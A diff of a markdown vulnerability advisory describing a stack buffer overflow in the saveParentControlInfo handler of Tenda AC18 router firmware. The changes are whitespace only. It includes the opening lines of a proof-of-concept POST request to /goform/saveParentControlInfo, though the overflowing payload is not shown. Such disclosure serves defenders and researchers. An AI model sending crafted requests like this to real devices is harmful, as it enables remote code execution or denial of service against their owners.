@@ -7,10 +7,11 @@ V15.03.05.05 and V15.03.05.19
    A stack-based buffer overflow vulnerability exists in the saveParentControlInfo function of Tenda AC18 firmware. The function processes user-controlled input from the time parameter by passing it to nptr, which is subsequently processed by sscanf with the format "%[^-]-%s". However, the function does not properly validate the size of the input, which allows an attacker to provide input that exceeds the buffer sizes of the destination variables (s1 and s2). This leads to a stack overflow, which may allow an attacker to execute arbitrary code or cause a Denial of Service (DoS) attack. The vulnerability could be exploited remotely by sending specially crafted input.
 
 ## 3. Recurring vulnerabilities and POC
-    In order to reproduce the vulnerability, the following steps can be followed:
+In order to reproduce the vulnerability, the following steps can be followed:
 3.1 Use the fat simulation firmware V15.03.05.19
+
 3.2 Attack with the following overflow POC attacks
-   POST /goform/saveParentControlInfo HTTP/1.1
+POST /goform/saveParentControlInfo HTTP/1.1
 Host: 192.168.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: */*
